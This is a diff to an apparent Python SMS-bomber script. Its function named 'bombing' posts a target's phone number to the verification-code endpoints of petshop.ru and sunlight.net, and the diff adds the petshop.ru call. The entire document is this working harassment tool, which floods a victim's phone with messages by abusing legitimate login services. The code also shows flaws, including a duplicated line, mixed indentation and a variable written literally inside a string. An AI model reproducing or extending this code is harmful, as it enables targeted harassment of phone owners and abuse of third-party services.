@@ -118,6 +118,11 @@ def bombing():
     email = name+f'{iteration}'+'@gmail.com'
     email = name+f'{iteration}'+'@gmail.com'
     try:
+	print('petshop.ru: отправлено')
+	requests.post('https://www.petshop.ru/ajax/?act=AuthForm.SendCode',data='{"token": "98fbdbcaf70b14a109feb91bbebbfb68","is_ajax": true,"phone": phone_plus,"force": true}', headers=HEADERS)	
+    except:
+	print('petshop.ru: не отправлено')
+    try:
         requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}, headers=HEADERS)
         print('SunLight: отправлено')
     except:
